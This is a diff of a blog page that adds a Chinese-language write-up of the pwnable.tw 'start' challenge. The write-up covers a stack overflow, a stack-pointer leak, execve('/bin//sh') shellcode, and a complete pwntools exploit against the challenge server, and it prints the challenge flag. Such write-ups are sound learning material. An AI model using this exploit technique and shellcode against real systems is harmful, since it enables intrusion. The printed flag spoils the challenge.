@@ -6,15 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="Pwnable.tw.start Pwnable.tw.start拿到题目32位，小端，静态编译，保护全关 运行一下输入超长字符串，程序Crash掉 拖入IDAstart函数里，先write出“Let’s start the CTF:”,之后输入。因为对write和read对栈的影响不太熟悉,所以gdb调试一下。第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。ed">
+<meta property="og:type" content="article">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
+<meta property="og:description" content="Pwnable.tw.start Pwnable.tw.start拿到题目32位，小端，静态编译，保护全关 运行一下输入超长字符串，程序Crash掉 拖入IDAstart函数里，先write出“Let’s start the CTF:”,之后输入。因为对write和read对栈的影响不太熟悉,所以gdb调试一下。第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。ed">
 <meta property="og:locale" content="zh">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/42f00637996ec6ee010976e734bb4f3e.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/9e8d630428e96afb7333aa69a7847980.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/0adf2605788cc8aceeb99dd3c410b539.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/947c25798c9158f4a7533ff905f441fb.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/8f1c0aa058a5b5bf1d2cd1c39b6e7e9c.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/4a61f97daea2591b6059e02cb244d0fc.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/1be6e5cebcdaf7728080f71f0683a225.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/77973a48820fee86086be01a0ea6ba9f.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/a932583c9a566cb25c62ffa7ec11f282.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/4c55e1f5766990deff0c14d19bc2528d.png">
+<meta property="og:updated_time" content="2019-09-10T08:58:12.511Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:description" content="Pwnable.tw.start Pwnable.tw.start拿到题目32位，小端，静态编译，保护全关 运行一下输入超长字符串，程序Crash掉 拖入IDAstart函数里，先write出“Let’s start the CTF:”,之后输入。因为对write和read对栈的影响不太熟悉,所以gdb调试一下。第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。ed">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/_resources/42f00637996ec6ee010976e734bb4f3e.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -146,235 +161,177 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-PWN/Pwnable.tw.start" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Pwnable.tw.start</p>
+<h3 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw.start"></a><strong>Pwnable.tw.start</strong></h3><h4 id="拿到题目"><a href="#拿到题目" class="headerlink" title="拿到题目"></a><strong>拿到题目</strong></h4><p>32位，小端，静态编译，保护全关<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/42f00637996ec6ee010976e734bb4f3e.png" alt></p>
+<h4 id="运行一下"><a href="#运行一下" class="headerlink" title="运行一下"></a><strong>运行一下</strong></h4><p>输入超长字符串，程序Crash掉<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/9e8d630428e96afb7333aa69a7847980.png" alt></p>
+<h4 id="拖入IDA"><a href="#拖入IDA" class="headerlink" title="拖入IDA"></a><strong>拖入IDA</strong></h4><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/0adf2605788cc8aceeb99dd3c410b539.png" alt><br>start函数里，先write出“Let’s start the CTF:”,之后输入。<br>因为对write和read对栈的影响不太熟悉,所以gdb调试一下。<br>第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。edx存放字符串长度，ebx存放fd。<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/947c25798c9158f4a7533ff905f441fb.png" alt><br>第二次int 80h后，从ecx拿到字符串的地址，并在此写值。<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/8f1c0aa058a5b5bf1d2cd1c39b6e7e9c.png" alt></p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h4><p>控制ret，指到我需要的地方，但是栈指针不知道，所以想办法先泄露出栈上的一个指针。注意到start在运行时，先push了esp和exit的地址，在ret后，之前push进去的esp就成了现在esp的值，那么可以利用write拿到之前push的esp，这样，我们就拿到了一个栈上的指针。</p>
+<p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/4a61f97daea2591b6059e02cb244d0fc.png" alt><br>之后，就是正常的利用思路。<br>payload = ‘A’ * offset + shellcode_addr + shellcode</p>
+<h5 id="计算溢出偏移量"><a href="#计算溢出偏移量" class="headerlink" title="计算溢出偏移量"></a><strong>计算溢出偏移量</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/1be6e5cebcdaf7728080f71f0683a225.png" alt><br>溢出偏移量 offset = 20</p>
+<h5 id="计算shellcode-addr"><a href="#计算shellcode-addr" class="headerlink" title="计算shellcode_addr"></a><strong>计算shellcode_addr</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/77973a48820fee86086be01a0ea6ba9f.png" alt></p>
+<p>那么泄露出来的 esp:0xffffd430与shellcode_addr:0xffffd444的差值为0x14。其实，计算方法也可以是：之前push的esp与push后产生的新esp差值为4，那么新的esp就等于泄露出来的esp(旧的esp) - 4，所以shellcode_addr = 泄露出来的值 - 4 + 0x14 + 4(ret) = 泄露出来的值 + 0x14</p>
+<h5 id="书写shellcode"><a href="#书写shellcode" class="headerlink" title="书写shellcode"></a><strong>书写shellcode</strong></h5><p>code  =  ‘’’<br>xor ecx,ecx<br>mul ecx<br>push eax<br>push 0x68732F2F<br>push 0x6E69622F<br>mov ebx,esp<br>mov al,0x0B<br>int 0x80<br>‘’’</p>
+<p>context(arch  =  ‘i386’,  os  =  ‘linux’,  endian  =  ‘little’,  wordsize  =  32)</p>
+<p>shellcode  =  asm(code).encode(‘hex’)<br>print  ‘[*] shellcode is %s ‘  %  shellcode<br>xor ecx,ecx与mul ecx 很巧妙，mul ecx将edx与eax同时置0</p>
+<h4 id="完整的exp如下"><a href="#完整的exp如下" class="headerlink" title="完整的exp如下"></a><strong>完整的exp如下</strong></h4><p>from  pwn  import  *<br>import  binascii</p>
+<p>def  makeShellcode():<br>    code  =’’’<br>    xor ecx,ecx<br>    mul ecx<br>    push eax<br>    push 0x68732F2F<br>    push 0x6E69622F<br>    mov ebx,esp<br>    mov al,0x0B<br>    int 0x80<br>    ‘’’</p>
+<pre><code>context(arch  =  &apos;x86&apos;,os  =  &apos;linux&apos;,  endian  =  &apos;little&apos;  ,  word_size  =  32)
+
+shellcode  =  asm(code).encode(&apos;hex&apos;)
+print  &apos;[*] shellcode is %s&apos;  %  shellcode
+return  shellcode</code></pre><p>def  pwnable_tw_start():<br>    s  =  remote(‘chall.pwnable.tw’,10000)<br>    s.recvuntil(‘Let&#39;s start the CTF:’)<br>    #leak Oldesp and calculate shellcode_addr<br>    s.send(‘A’  *  20  +  p32(0x08048087))<br>    Oldesp  =  u32(s.recv(4))<br>    shellcode_addr  =  Oldesp  +  0x14<br>    print  ‘[*] shellcode_addr is %s’  %  hex(shellcode_addr)<br>    #Get shell<br>    shellcode  =  makeShellcode()<br>    payload  =  ‘A’  *  20  +  p32(shellcode_addr)+binascii.a2b_hex(shellcode)<br>    s.send(payload)<br>    s.interactive()</p>
+<p>def  main():<br>    pwnable_tw_start()</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()</p>
+<p>#FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</p>
+<h5 id="运行结果如图："><a href="#运行结果如图：" class="headerlink" title="运行结果如图："></a><strong>运行结果如图：</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/a932583c9a566cb25c62ffa7ec11f282.png" alt></p>
+<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h4><p>系统调用表：<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a><br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/4c55e1f5766990deff0c14d19bc2528d.png" alt></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Reverse/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/PWN/Pwnable.tw.start/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.693Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/10/PWN/简单栈溢出/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.660Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.643Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.627Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.609Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.575Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PWN/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.559Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -398,8 +355,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
